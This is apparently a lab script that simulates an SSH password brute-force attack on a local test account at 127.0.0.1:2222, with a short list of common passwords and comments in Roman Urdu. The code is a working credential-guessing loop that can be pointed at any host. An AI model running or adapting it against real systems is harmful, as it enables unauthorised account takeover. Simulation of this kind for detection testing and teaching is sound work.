import time
import paramiko

HOST, PORT = "127.0.0.1", 2222
USER = "testuser"

# Password guesses jo attacker try karega (akhri sahi hai)
PASSWORD_LIST = [
    "123456", "password", "admin123", "qwerty", "letmein",
    "iloveyou", "welcome1", "football", "monkey123", "root123",
    "Summer2026",   # <- ye sahi password hai, is par login ho jayega
]

print("Starting brute-force simulation against", f"{HOST}:{PORT}")

for pwd in PASSWORD_LIST:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, port=PORT, username=USER, password=pwd, timeout=3)
        print(f"[+] SUCCESS with password: {pwd}")
        client.close()
        break
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {pwd}")
    except Exception as e:
        print(f"[!] Error: {e}")
    time.sleep(0.3)   # thori si delay, real attack jesa